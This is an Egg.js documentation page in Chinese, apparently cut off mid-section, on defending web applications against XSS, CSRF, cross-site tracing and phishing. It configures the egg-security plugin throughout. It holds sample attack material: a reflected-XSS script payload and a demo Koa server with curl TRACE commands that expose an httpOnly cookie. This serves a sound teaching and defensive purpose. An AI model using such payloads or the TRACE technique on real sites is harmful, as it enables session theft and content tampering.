<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name="theme-color" content="#000000"><link rel="manifest" href="/manifest.json"><link rel="shortcut icon" href="/favicon.png"><style class="_styletron_hydrate_"></style><title>安全</title><meta name="description" content="Born to build better enterprise frameworks and apps"><link href="/static/css/post.d62265dc.css" rel="stylesheet"></head><body><noscript>You need to enable JavaScript to run this app.</noscript><div id="root"><div class="ant-layout" data-reactroot=""><div class="header-module__header___3ADJ9 ant-layout-header"><div class="ant-row-flex"><div class="ant-col-xs-12 ant-col-md-20 ant-col-lg-2"><div class="header-module__logo___3yTXp"><a href="/"><img src="/logo.svg" alt="logo"/></a></div></div><div class="ant-col-xs-0 ant-col-md-0 ant-col-lg-20"><ul class="ant-menu header-module__menu___3yEtW ant-menu-light ant-menu-root ant-menu-horizontal" role="menu"><li class="ant-menu-item" role="menuitem"><a href="/zh-cn/intro/">指南</a></li><li class="ant-menu-item" role="menuitem"><a href="/api/">API</a></li><li class="ant-menu-item" role="menuitem"><a href="/zh-cn/tutorials/index.html">教程</a></li><li class="ant-menu-item" role="menuitem"><a href="https://github.com/search?q=topic%3Aegg-plugin&amp;type=Repositories">插件</a></li><li class="ant-menu-item" role="menuitem"><a href="https://github.com/eggjs/egg/releases">发布日志</a></li></ul></div><div style="text-align:right" class="ant-col-xs-12 ant-col-md-4 ant-col-lg-2"><button type="button" class="ant-btn"><span>Languages</span></button></div></div></div><div class="ant-layout-content"><div class="basic_layout-module__content___3flpY ant-layout"><div class="sider-module__side___1Cadj ant-layout-sider ant-layout-sider-light" style="flex:0 0 200px;max-width:200px;min-width:200px;width:200px"><div class="ant-layout-sider-children"><ul class="ant-menu sider-module__menu___2GqPr ant-menu-light ant-menu-root ant-menu-inline" role="menu"><li class="ant-menu-submenu ant-menu-submenu-inline ant-menu-submenu-open" role="menuitem"><div style="padding-left:24px" class="ant-menu-submenu-title" aria-expanded="true" aria-owns="0$Menu" aria-haspopup="true"><span>新手指南</span><i class="ant-menu-submenu-arrow"></i></div><ul id="0$Menu" class="ant-menu  ant-menu-sub ant-menu-inline" role="menu"><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/intro/index.html">Egg.js 是什么?</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/intro/egg-and-koa.html">Egg.js 和 Koa</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/intro/quickstart.html">快速入门</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/tutorials/progressive.html">渐进式开发</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/migration.html">2.x 升级指南</a></li></ul></li><li class="ant-menu-submenu ant-menu-submenu-inline ant-menu-submenu-open" role="menuitem"><div style="padding-left:24px" class="ant-menu-submenu-title" aria-expanded="true" aria-owns="1$Menu" aria-haspopup="true"><span>基础功能</span><i class="ant-menu-submenu-arrow"></i></div><ul id="1$Menu" class="ant-menu  ant-menu-sub ant-menu-inline" role="menu"><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/basics/structure.html">目录结构</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/basics/objects.html">内置对象</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/basics/env.html">运行环境</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/basics/config.html">配置</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/basics/middleware.html">中间件</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/basics/router.html">Router</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/basics/controller.html">Controller</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/basics/service.html">Service</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/basics/plugin.html">插件</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/basics/schedule.html">定时任务</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/basics/extend.html">框架扩展</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/basics/app-start.html">启动自定义</a></li></ul></li><li class="ant-menu-submenu ant-menu-submenu-inline ant-menu-submenu-open" role="menuitem"><div style="padding-left:24px" class="ant-menu-submenu-title" aria-expanded="true" aria-owns="2$Menu" aria-haspopup="true"><span>核心功能</span><i class="ant-menu-submenu-arrow"></i></div><ul id="2$Menu" class="ant-menu  ant-menu-sub ant-menu-inline" role="menu"><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/core/development.html">本地开发</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/core/unittest.html">单元测试</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/core/deployment.html">应用部署</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/core/logger.html">日志</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/core/httpclient.html">HttpClient</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/core/cookie-and-session.html">Cookie and Session</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/core/cluster-and-ipc.html">多进程模型和进程间通讯</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/core/view.html">模板渲染</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/core/error-handling.html">异常处理</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/core/security.html">安全</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/core/i18n.html">国际化</a></li></ul></li><li class="ant-menu-submenu ant-menu-submenu-inline ant-menu-submenu-open" role="menuitem"><div style="padding-left:24px" class="ant-menu-submenu-title" aria-expanded="true" aria-owns="3$Menu" aria-haspopup="true"><span>教程</span><i class="ant-menu-submenu-arrow"></i></div><ul id="3$Menu" class="ant-menu  ant-menu-sub ant-menu-inline" role="menu"><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/tutorials/mysql.html">MySQL</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/tutorials/restful.html">RESTful API</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/tutorials/passport.html">Passport 鉴权</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/tutorials/socketio.html">Socket.IO</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/tutorials/assets.html">静态资源</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/tutorials/typescript.html">TypeScript</a></li></ul></li><li class="ant-menu-submenu ant-menu-submenu-inline ant-menu-submenu-open" role="menuitem"><div style="padding-left:24px" class="ant-menu-submenu-title" aria-expanded="true" aria-owns="4$Menu" aria-haspopup="true"><span>进阶</span><i class="ant-menu-submenu-arrow"></i></div><ul id="4$Menu" class="ant-menu  ant-menu-sub ant-menu-inline" role="menu"><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/advanced/loader.html">Loader</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/advanced/plugin.html">插件开发</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/advanced/framework.html">框架开发</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/advanced/cluster-client.html">多进程研发模式增强</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/advanced/view-plugin.html">模板插件开发规范</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/style-guide.html">代码风格指南</a></li></ul></li><li class="ant-menu-submenu ant-menu-submenu-inline ant-menu-submenu-open" role="menuitem"><div style="padding-left:24px" class="ant-menu-submenu-title" aria-expanded="true" aria-owns="5$Menu" aria-haspopup="true"><span>社区</span><i class="ant-menu-submenu-arrow"></i></div><ul id="5$Menu" class="ant-menu  ant-menu-sub ant-menu-inline" role="menu"><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/plugins/">内置插件列表</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/contributing.html">如何贡献</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/resource.html">资源</a></li><li class="ant-menu-item" role="menuitem" style="padding-left:48px"><a href="/zh-cn/faq.html">常见问题</a></li></ul></li></ul></div></div><div class="basic_layout-module__post___2Z7KK ant-layout-content"><div class="ant-row" style="margin-left:-8px;margin-right:-8px"><div style="padding-left:8px;padding-right:8px" class="ant-col-xs-24 ant-col-md-18"><div class="markdown-body" style="font-size:14px"><div><h2 id="web-安全概念">Web 安全概念</h2><p>Web 应用中存在很多安全风险，这些风险会被黑客利用，轻则篡改网页内容，重则窃取网站内部数据，更为严重的则是在网页中植入恶意代码，使得用户受到侵害。常见的安全漏洞如下：</p><ul><li>XSS 攻击：对 Web 页面注入脚本，使用 JavaScript 窃取用户信息，诱导用户操作。</li><li>CSRF 攻击：伪造用户请求向网站发起恶意请求。</li><li>钓鱼攻击：利用网站的跳转链接或者图片制造钓鱼陷阱。</li><li>HTTP参数污染：利用对参数格式验证的不完善，对服务器进行参数注入攻击。</li><li>远程代码执行：用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。</li></ul><p>而框架本身针对 Web 端常见的安全风险内置了丰富的解决方案：</p><ul><li>利用 <a href="https://github.com/eggjs/egg/blob/master/docs/source/zh-cn/basics/extend.md">extend</a> 机制扩展了 Helper API, 提供了各种模板过滤函数，防止钓鱼或 XSS 攻击。</li><li>常见 Web 安全头的支持。</li><li>CSRF 的防御方案。</li><li>灵活的安全配置，可以匹配不同的请求 url 。</li><li>可定制的白名单，用于安全跳转和 url 过滤。</li><li>各种模板相关的工具函数做预处理。</li></ul><p>在框架中内置了安全插件 <a href="https://github.com/eggjs/egg-security">egg-security</a>， 提供了默认的安全实践。</p><h3 id="开启与关闭配置">开启与关闭配置</h3><p>注意：除非清楚的确认后果，否则不建议擅自关闭安全插件提供的功能。</p><p>框架的安全插件是默认开启的，如果我们想关闭其中一些安全防范，直接设置该项的 <code>enable</code> 属性为 false 即可。例如关闭 xframe 防范：</p><pre><code class="language-js">exports.security = {
  xframe: {
    enable: false,
  },
};</code></pre><h3 id="match-和-ignore">match 和 ignore</h3><p>match 和 ignore 使用方法和格式与<a href="../basics/middleware.md#match和ignore">中间件通用配置</a>一致。</p><p>如果只想开启针对某一路径，则配置 match 选项，例如只针对 <code>/example</code> 开启 CSP：</p><pre><code class="language-js">exports.security = {
  csp: {
    match: &#x27;/example&#x27;,
    policy: {
      //...
    },
  },
};</code></pre><p>如果需要针对某一路径忽略某安全选项，则配置 ignore 选项，例如针对 <code>/example</code> 关闭 xframe，以便合作商户能够嵌入我们的页面：</p><pre><code class="language-js">exports.security = {
  csp: {
    ignore: &#x27;/example&#x27;,
    xframe: {
      //...
    },
  },
};</code></pre><p>如果要针对内部 ip 关闭部分安全防范：</p><pre><code class="language-js">exports.security = {
  csrf: {
    // 判断是否需要 ignore 的方法，请求上下文 context 作为第一个参数
    ignore: ctx =&gt; isInnerIp(ctx.ip),
  },
}</code></pre><p>下面我们会针对具体的场景，来讲解如何使用框架提供的安全方案进行 Web 安全防范。</p><h2 id="安全威胁xss的防范">安全威胁<code>XSS</code>的防范</h2><p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">XSS</a>（cross-site scripting跨域脚本攻击）攻击是最常见的 Web 攻击，其重点是『跨域』和『客户端执行』。</p><p>XSS 攻击一般分为两类：</p><ul><li>Reflected XSS（反射型的 XSS 攻击）</li><li>Stored XSS（存储型的 XSS 攻击）</li></ul><h3 id="reflected-xss">Reflected XSS</h3><p>反射型的 XSS 攻击，主要是由于服务端接收到客户端的不安全输入，在客户端触发执行从而发起 Web 攻击。比如：</p><p>在某购物网站搜索物品，搜索结果会显示搜索的关键词。搜索关键词填入<code>&lt;script&gt;alert(&#x27;handsome boy&#x27;)&lt;/script&gt;</code>, 点击搜索。页面没有对关键词进行过滤，这段代码就会直接在页面上执行，弹出 alert。</p><h4 id="防范方式">防范方式</h4><p>框架提供了 <code>helper.escape()</code> 方法对字符串进行 XSS 过滤。</p><pre><code class="language-js">const str = &#x27;&gt;&lt;script&gt;alert(&quot;abc&quot;) &lt;/script&gt;&lt;&#x27;;
console.log(ctx.helper.escape(str));
// =&gt; &amp;gt;&amp;lt;script&amp;gt;alert(&amp;quot;abc&amp;quot;) &amp;lt;/script&amp;gt;&amp;lt;</code></pre><p>当网站需要直接输出用户输入的结果时，请务必使用 <code>helper.escape()</code> 包裹起来，如在 <a href="https://github.com/eggjs/egg-view-nunjucks">egg-view-nunjucks</a> 里面就覆盖掉了内置的 <code>escape</code>。</p><p>另外一种情况，网站输出的内容会提供给 JavaScript 来使用。这个时候需要使用 <code>helper.sjs()</code> 来进行过滤。</p><p><code>helper.sjs()</code> 用于在 JavaScript（包括 onload 等 event）中输出变量，会对变量中字符进行 JavaScript ENCODE，
将所有非白名单字符转义为 <code>\x</code> 形式，防止 XSS 攻击，也确保在 js 中输出的正确性。使用实例：</p><pre><code class="language-js">const foo = &#x27;&quot;hello&quot;&#x27;;

// 未使用 sjs
console.log(`var foo = &quot;${foo}&quot;;`);
// =&gt; var foo = &quot;&quot;hello&quot;&quot;;

// 使用 sjs
console.log(`var foo = &quot;${this.helper.sjs(foo)}&quot;;`);
// =&gt; var foo = &quot;\\x22hello\\x22&quot;;</code></pre><p>还有一种情况，有时候我们需要在 JavaScript 中输出 json ，若未做转义，易被利用为 XSS 漏洞。框架提供了 <code>helper.sjson()</code> 宏做 json encode，会遍历 json 中的 key ，将 value 的值中，所有非白名单字符转义为 <code>\x</code> 形式，防止 XSS 攻击。同时保持 json 结构不变。
若存在模板中输出一个 JSON 字符串给 JavaScript 使用的场景，请使用 <code>helper.sjson(变量名)</code> 进行转义。</p><p><strong>处理过程较复杂，性能损耗较大，请仅在必要时使用。</strong></p><p>实例:</p><pre><code class="language-html">  &lt;script&gt;
    window.locals = {{ helper.sjson(locals) }};
  &lt;/script&gt;</code></pre><h3 id="stored-xss">Stored XSS</h3><p>基于存储的 XSS 攻击，是通过提交带有恶意脚本的内容存储在服务器上，当其他人看到这些内容时发起 Web 攻击。一般提交的内容都是通过一些富文本编辑器编辑的，很容易插入危险代码。</p><h4 id="防范方式">防范方式</h4><p>框架提供了 <code>helper.shtml()</code> 方法对字符串进行 XSS 过滤。</p><p>注意，将富文本（包含 HTML 代码的文本）当成变量直接在模版里面输出时，需要用到 shtml 来处理。
使用 shtml 可以输出 HTML 的 tag，同时执行 XSS 的过滤动作，过滤掉非法的脚本。</p><p><strong>由于是一个非常复杂的安全处理过程，对服务器处理性能一定影响，如果不是输出 HTML，请勿使用。</strong></p><p>简单示例：</p><pre><code class="language-js">// js
const value = `&lt;a href=&quot;http://www.domain.com&quot;&gt;google&lt;/a&gt;&lt;script&gt;evilcode…&lt;/script&gt;`;</code></pre><pre><code class="language-html">// 模板
&lt;html&gt;
&lt;body&gt;
  {{ helper.shtml(value) }}
&lt;/body&gt;
&lt;/html&gt;
// =&gt; &lt;a href=&quot;http://www.domain.com&quot;&gt;google&lt;/a&gt;&amp;lt;script&amp;gt;evilcode…&amp;lt;/script&amp;gt;</code></pre><p>shtml 在 <a href="https://github.com/leizongmin/js-xss/">xss</a> 模块基础上增加了针对域名的过滤。</p><ul><li><a href="https://github.com/leizongmin/js-xss/blob/master/lib/default.js">默认规则</a></li><li>自定义过滤项： <a href="http://jsxss.com/zh/options.html">http://jsxss.com/zh/options.html</a></li></ul><p>例如只支持 a 标签，且除了 title 其他属性都过滤掉： <code>whiteList: {a: [&#x27;title&#x27;]}</code></p><p>options:</p><ul><li><code>config.helper.shtml.domainWhiteList: []</code> 可拓展 href 和 src 中允许的域名白名单。</li></ul><p>注意，shtml 使用了严格的白名单机制，除了过滤掉 XSS 风险的字符串外，
在<a href="https://github.com/leizongmin/js-xss/blob/master/lib/default.js">默认规则</a>外的 tag 和 attr 都会被过滤掉。</p><p>例如 HTML 标签就不在白名单中，</p><pre><code class="language-js">const html = &#x27;&lt;html&gt;&lt;/html&gt;&#x27;;

// html
{{ helper.shtml(html) }}

// 输出空</code></pre><p>常见的 <code>data-xx</code> 属性由于不在白名单中，所以都会被过滤。</p><p>所以，一定要注意 shtml 的适用场景，一般是针对来自用户的富文本输入，切忌滥用，功能既受到限制，又会影响服务端性能。
此类场景一般是论坛、评论系统等，即便是论坛等如果不支持 HTML 内容输入，也不要使用此 Helper，直接使用 <code>escape</code> 即可。</p><h3 id="jsonp-xss">JSONP XSS</h3><p>JSONP 的 callback 参数非常危险，他有两种风险可能导致 XSS</p><p>1、callback 参数意外截断js代码，特殊字符单引号双引号，换行符均存在风险。</p><p>2、callback 参数恶意添加标签（如 <code>&lt;script&gt;</code> ），造成 XSS 漏洞。</p><p>参考 <a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/">JSONP 安全攻防</a></p><p>框架内部使用 <a href="https://github.com/node-modules/jsonp-body">jsonp-body</a> 来对 JSONP 请求进行安全防范。</p><p>防御内容：</p><ul><li>callback 函数名词最长 50 个字符限制</li><li>callback 函数名只允许 <code>[</code>, <code>]</code>, <code>a-zA-Z0123456789_</code>, <code>$</code>, <code>.</code>，防止一般的 XSS，utf-7 XSS等攻击。</li></ul><p>可定义配置：</p><ul><li>callback 默认 <code>_callback</code>，可以重命名。</li><li>limit - 函数名 length 限制，默认 50。</li></ul><h3 id="其他-xss-的防范方式">其他 XSS 的防范方式</h3><p>浏览器自身具有一定针对各种攻击的防范能力，他们一般是通过开启 Web 安全头生效的。框架内置了一些常见的 Web 安全头的支持。</p><h4 id="csp">CSP</h4><p>W3C 的 Content Security Policy，简称 CSP，主要是用来定义页面可以加载哪些资源，减少 XSS 的发生。</p><p>框架内支持 CSP 的配置，不过是默认关闭的，开启后可以有效的防止 XSS 攻击的发生。要配置 CSP , 需要对 CSP 的 policy 策略有了解，具体细节可以参考 <a href="https://www.zhihu.com/question/21979782">CSP 是什么</a>。</p><h4 id="x-download-optionsnoopen">X-Download-Options:noopen</h4><p>默认开启，禁用 IE 下下载框Open按钮，防止 IE 下下载文件默认被打开 XSS。</p><h4 id="x-content-type-optionsnosniff">X-Content-Type-Options:nosniff</h4><p>禁用 IE8 自动嗅探 mime 功能例如 <code>text/plain</code> 却当成 <code>text/html</code> 渲染，特别当本站点 serve 的内容未必可信的时候。</p><h4 id="x-xss-protection">X-XSS-Protection</h4><p>IE 提供的一些 XSS 检测与防范，默认开启</p><ul><li>close 默认值false，即设置为 <code>1; mode=block</code></li></ul><h2 id="安全威胁-csrf-的防范">安全威胁 CSRF  的防范</h2><p><a href="https://www.owasp.org/index.php/CSRF">CSRF</a>（Cross-site request forgery跨站请求伪造，也被称为 <code>One Click Attack</code> 或者 <code>Session Riding</code>，通常缩写为 CSRF 或者 XSRF，是一种对网站的恶意利用。
CSRF 攻击会对网站发起恶意伪造的请求，严重影响网站的安全。因此框架内置了 CSRF 防范方案。</p><h3 id="防范方式">防范方式</h3><p>通常来说，对于 CSRF 攻击有一些通用的<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet#CSRF_Specific_Defense">防范方案</a>，简单的介绍几种常用的防范方案：</p><ul><li>Synchronizer Tokens：通过响应页面时将 token 渲染到页面上，在 form 表单提交的时候通过隐藏域提交上来。</li><li>Double Cookie Defense：将 token 设置在 Cookie 中，在提交 post 请求的时候提交 Cookie，并通过 header 或者 body 带上 Cookie 中的 token，服务端进行对比校验。</li><li>Custom Header：信任带有特定的 header（例如 <code>X-Requested-With: XMLHttpRequest</code>）的请求。这个方案可以被绕过，所以 rails 和 django 等框架都<a href="https://www.djangoproject.com/weblog/2011/feb/08/security/">放弃了该防范方式</a>。</li></ul><p>框架结合了上述几种防范方式，提供了一个可配置的 CSRF 防范策略。</p><h4 id="使用方式">使用方式</h4><h5 id="同步表单的-csrf-校验">同步表单的 CSRF 校验</h5><p>在同步渲染页面时，在表单请求中增加一个 name 为 <code>_csrf</code> 的 url query，值为 <code>ctx.csrf</code>，这样用户在提交这个表单的时候会将 CSRF token 提交上来：</p><pre><code class="language-html">&lt;form method=&quot;POST&quot; action=&quot;/upload?_csrf={{ ctx.csrf | safe }}&quot; enctype=&quot;multipart/form-data&quot;&gt;
  title: &lt;input name=&quot;title&quot; /&gt;
  file: &lt;input name=&quot;file&quot; type=&quot;file&quot; /&gt;
  &lt;button type=&quot;submit&quot;&gt;upload&lt;/button&gt;
&lt;/form&gt;</code></pre><p>传递 CSRF token 的字段可以在配置中改变：</p><pre><code class="language-js">// config/config.default.js
module.exports = {
  security: {
    csrf: {
      queryName: &#x27;_csrf&#x27;, // 通过 query 传递 CSRF token 的默认字段为 _csrf
      bodyName: &#x27;_csrf&#x27;, // 通过 body 传递 CSRF token 的默认字段为 _csrf
    },
  },
};</code></pre><p>为了防范 <a href="http://breachattack.com/">BREACH 攻击</a>，通过同步方式渲染到页面上的 CSRF token 在每次请求时都会变化，<a href="https://github.com/eggjs/egg-view-nunjucks">egg-view-nunjucks</a> 等 View 插件会自动对 Form 进行注入，对应用开发者无感知。</p><h5 id="ajax-请求">AJAX 请求</h5><p>在 CSRF 默认配置下，token 会被设置在 Cookie 中，在 AJAX 请求的时候，可以从 Cookie 中取到 token，放置到 query、body 或者 header 中发送给服务端。</p><p>In jQuery:</p><pre><code class="language-js">var csrftoken = Cookies.get(&#x27;csrfToken&#x27;);

function csrfSafeMethod(method) {
  // these HTTP methods do not require CSRF protection
  return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
}
$.ajaxSetup({
  beforeSend: function(xhr, settings) {
    if (!csrfSafeMethod(settings.type) &amp;&amp; !this.crossDomain) {
      xhr.setRequestHeader(&#x27;x-csrf-token&#x27;, csrftoken);
    }
  },
});</code></pre><p>通过 header 传递 CSRF token 的字段也可以在配置中改变：</p><pre><code class="language-js">// config/config.default.js
module.exports = {
  security: {
    csrf: {
      headerName: &#x27;x-csrf-token&#x27;, // 通过 header 传递 CSRF token 的默认字段为 x-csrf-token
    },
  },
};</code></pre><h4 id="session-vs-cookie-存储">Session vs Cookie 存储</h4><p>默认配置下，框架会将 CSRF token 存在 Cookie 中，以方便 AJAX 请求获取到。但是所有的子域名都可以设置 Cookie，因此当我们的应用处于无法保证所有的子域名都受控的情况下，存放在 Cookie 中可能有被 CSRF 攻击的风险。框架提供了一个配置项，可以将 token 存放到 Session 中。</p><pre><code class="language-js">// config/config.default.js
module.exports = {
  security: {
    csrf: {
      useSession: true, // 默认为 false，当设置为 true 时，将会把 csrf token 保存到 Session 中
      cookieName: &#x27;csrfToken&#x27;, // Cookie 中的字段名，默认为 csrfToken
      sessionName: &#x27;csrfToken&#x27;, // Session 中的字段名，默认为 csrfToken
    },
  },
};</code></pre><h4 id="忽略-json-请求已废弃">忽略 JSON 请求(已废弃)</h4><p><strong>注意：该选项已废弃，攻击者可以<a href="https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/">通过 flash + 307 来攻破</a>，请不要在生产环境打开改选项！</strong></p><p>在 <a href="https://en.wikipedia.org/wiki/Same-origin_policy">SOP</a> 的安全策略保护下，基本上所有的现代浏览器都不允许跨域发起 content-type 为 JSON 的请求，因此我们可以直接放过类型的 JSON 格式的请求。</p><pre><code class="language-js">// config/config.default.js
module.exports = {
  security: {
    csrf: {
      ignoreJSON: true, // 默认为 false，当设置为 true 时，将会放过所有 content-type 为 `application/json` 的请求
    },
  },
};</code></pre><h4 id="刷新-csrf-token">刷新 CSRF token</h4><p> 当 CSRF token 存储在 Cookie 中时，一旦在同一个浏览器上发生用户切换，新登陆的用户将会依旧使用旧的 token（之前用户使用的），这会带来一定的安全风险，因此在每次用户登陆的时候都<strong>必须刷新 CSRF token</strong>。</p><pre><code class="language-js">// login controller
exports.login = function* (ctx) {
  const { username, password } = ctx.request.body;
  const user = yield ctx.service.user.find({ username, password });
  if (!user) ctx.throw(403);
  ctx.session = { user };

  // 调用 rotateCsrfSecret 刷新用户的 CSRF token
  ctx.rotateCsrfSecret();

  ctx.body = { success: true };
}</code></pre><h2 id="安全威胁-xst-的防范">安全威胁 XST 的防范</h2><p><a href="https://www.owasp.org/index.php/XST">XST</a> 的全称是 <code>Cross-Site Tracing</code>，客户端发 TRACE 请求至服务器，如果服务器按照标准实现了 TRACE 响应，则在 response body 里会返回此次请求的完整头信息。通过这种方式，客户端可以获取某些敏感的头字段，例如 httpOnly 的 Cookie。</p><p>下面我们基于 Koa 来实现一个简单的支持 TRACE 方法的服务器：</p><pre><code class="language-javascript">  var koa = require(&#x27;koa&#x27;);
  var app = koa();

  app.use(function* (next) {
    this.cookies.set(&#x27;a&#x27;, 1, { httpOnly: true });
    if (this.method === &#x27;TRACE&#x27;) {
      var body = &#x27;&#x27;;
      for (header in this.headers) {
        body += header + &#x27;: &#x27; + this.headers[header] + &#x27;\r\n&#x27;;
      }
      this.body = body;
    }
    yield* next;
  });

  app.listen(7001);</code></pre><p>启动服务后，先发个 GET 请求 <code>curl -i http://127.0.0.1:7001</code>，得到如下响应：</p><pre><code>HTTP/1.1 200 OK
X-Powered-By: koa
Set-Cookie: a=1; path=/; httponly
Content-Type: text/plain; charset=utf-8
Content-Length: 2
Date: Thu, 06 Nov 2014 05:04:42 GMT
Connection: keep-alive

OK</code></pre><p>服务器设置了一个 httpOnly 的 Cookie 为 1，在浏览器环境中，是无法通过脚本获取它的。</p><p>接着我们发 TRACE 请求到服务器<code>curl -X TRACE -b a=1 -i http://127.0.0.1:7001</code>，并带上 Cookie，得到如下响应：</p><pre><code>  HTTP/1.1 200 OK
  X-Powered-By: koa
  Set-Cookie: a=1; path=/; httponly
  Content-Type: text/plain; charset=utf-8
  Content-Length: 73
  Date: Thu, 06 Nov 2014 05:07:47 GMT
  Connection: keep-alive

  user-agent: curl/7.37.1
  host: 127.0.0.1:7001
  accept: */*
  cookie: a=1</code></pre><p>在响应体里可以看到完整的头信息，这样我们就绕过了 httpOnly 的限制，拿到了cookie=1，造成了很大的风险。</p><h3 id="拓展阅读">拓展阅读</h3><p><a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html">http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html</a></p><p><a href="http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misunderstood-vulnerability/">http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misunderstood-vulnerability/</a></p><h3 id="防范方式">防范方式</h3><p>框架已经禁止了 trace，track，options 三种危险类型请求。</p><h2 id="安全威胁-钓鱼攻击-的防范">安全威胁 <code>钓鱼攻击</code> 的防范</h2><p>钓鱼有多种方式，这里介绍 url 钓鱼、图片钓鱼和 iframe 钓鱼。</p><h3 id="url-钓鱼">url 钓鱼</h3><p>服务端未对传入的跳转 url 变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。
由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易；
也可能引发的 XSS 漏洞（主要是跳转常常使用 302 跳转，即设置 HTTP 响应头，Locatioin: url，如果 url 包含了 CRLF，则可能隔断了 HTTP 响应头，使得后面部分落到了 HTTP body，从而导致 XSS 漏洞）。</p><h3 id="防范方式">防范方式</h3><ul><li>若跳转的 url 事先是可以确定的，包括 url 和参数的值，则可以在后台先配置好，url 参数只需传对应 url 的索引即可，通过索引找到对应具体 url 再进行跳转；</li><li>若跳转的 url 事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名；</li><li>若 1 和 2 都不满足，url 事先无法确定，只能通过前端参数传入，则必须在跳转的时候对 url 进行按规则校验：判断 url 是否在应用授权的白名单内。</li></ul><p>框架提供了安全跳转的方法，可以通过配置白名单避免这种风险。</p><ul><li><code>ctx.redirect(url)</code> 如果不在配置的白名单内，则禁止。</li><li><code>ctx.unsafeRedirect(url)</code> 一般不建议使用，明确了解可能带来的风险后使用。</li></ul><p>安全方案覆盖了默认的<code>ctx.redirect</code>方法，所有的跳转均会经过安全域名的判断。</p><p>用户如果使用<code>ctx.redirect</code>方法，需要在应用的配置文件中做如下配置：</p><pre><code class="language-js">// config/config.default.js
exports.security = {
  domainWhiteList:[&#x27;.domain.com&#x27;],  // 安全白名单，以 . 开头
};</code></pre><p>若用户没有配置 <code>domainWhiteList</code> 或者 <code>domainWhiteList</code>数组内为空，则默认会对所有跳转请求放行，即等同于<code>ctx.unsafeRedirect(url)</code></p><h3 id="图片钓鱼">图片钓鱼</h3><p>如果可以允许用户向网页里插入未经验证的外链图片，这有可能出现钓鱼风险。</p><p>比如常见的 <code>401钓鱼</code>, 攻击者在访问页面时，页面弹出验证页面让用户输入帐号及密码，当用户输入之后，帐号及密码就存储到了黑客的服务器中。
